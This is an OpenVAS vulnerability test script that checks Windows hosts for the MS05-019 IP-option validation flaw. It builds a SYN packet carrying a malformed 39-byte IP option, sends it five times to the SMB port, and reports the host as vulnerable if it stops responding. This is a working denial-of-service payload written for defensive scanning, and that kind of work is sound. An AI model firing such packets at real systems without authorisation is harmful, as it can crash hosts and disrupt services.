###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_ms_windows_ip_validation_code_exec_vuln.nasl 9351 2018-04-06 07:05:43Z cfischer $
#
# Microsoft Windows Internet Protocol Validation Remote Code Execution Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_affected = "Microsoft Windows XP SP2 and prior.
  Microsoft Windows 2000 Server SP4 and prior.

  Run Windows Update and update the listed hotfixes or download and
  update mentioned hotfixes in the advisory from the below link,
  http://technet.microsoft.com/en-us/security/bulletin/ms05-019";

tag_impact = "Successful exploitation will allow attacker to cause a denial of service
  and possibly execute arbitrary code via crafted IP packets with malformed
  options.
  Impact Level: System";
tag_insight = "The flaw is due to insufficient validation of IP options and can be
  exploited to cause a vulnerable system to stop responding and restart or may
  allow execution of arbitrary code by sending a specially crafted IP packet
  to a vulnerable system.";
tag_summary = "The host is running Microsoft Windows and is prone to remote code
  execution vulnerability.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902588");
  script_version("$Revision: 9351 $");
  script_cve_id("CVE-2005-0048", "CVE-2005-0688", "CVE-2004-0790",
                "CVE-2004-1060", "CVE-2004-0230");
  script_bugtraq_id(13116, 13658, 13124, 10183);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:05:43 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2011-11-21 15:15:15 +0530 (Mon, 21 Nov 2011)");
  script_name("Microsoft Windows Internet Protocol Validation Remote Code Execution Vulnerability");

  script_xref(name : "URL" , value : "http://secunia.com/advisories/14512");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/22341");
  script_xref(name : "URL" , value : "http://securitytracker.com/id/1013686");
  script_xref(name : "URL" , value : "http://technet.microsoft.com/en-us/security/bulletin/ms05-019");
  script_xref(name : "URL" , value : "http://technet.microsoft.com/en-us/security/bulletin/ms06-064");

  script_category(ACT_KILL_HOST);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Windows : Microsoft Bulletins");
  script_dependencies("smb_nativelanman.nasl", "netbios_name_get.nasl", "os_detection.nasl");
  script_require_ports(139, 445);
  script_mandatory_keys("Host/runs_windows");
  script_exclude_keys("SMB/samba", "keys/TARGET_IS_IPV6");

  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name : "affected" , value : tag_affected);

  script_tag(name:"qod_type", value:"registry");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("smb_nt.inc");
include("host_details.inc");

if(TARGET_IS_IPV6()){
  exit(0);
}

## Get SMB Port
port = kb_smb_transport();
if(!port) {
  port = 445;
}

## Check Port State
if(!get_port_state(port)) {
  exit(0);
}

## Building Exploit
dstaddr = get_host_ip();
srcaddr = this_host();
sport = rand() % (65536 - 1024) + 1024;

## IP packet with an option size 39
options = raw_string(0x03, 0x27, crap(data:"G", length:38));

ip = forge_ip_packet( ip_v   : 4,
                      ip_hl  : 15,
                      ip_tos : 0,
                      ip_len : 20,
                      ip_id  : rand(),
                      ip_p   : IPPROTO_TCP,
                      ip_ttl : 64,
                      ip_off : 0,
                      ip_src : srcaddr,
                      data   : options );


tcp = forge_tcp_packet( ip       : ip,
                        th_sport : sport,
                        th_dport : port,
                        th_flags : TH_SYN,
                        th_seq   : rand(),
                        th_ack   : 0,
                        th_x2    : 0,
                        th_off   : 5,
                        th_win   : 512,
                        th_urp   : 0 );

## Sending Exploit
start_denial();
for( i = 0; i < 5 ; i ++ ) {
  result = send_packet(tcp,pcap_active:FALSE);
}
alive = end_denial();

## Confirm Host is Still Alive and Responding
if(! alive) {
  security_message(port);
}
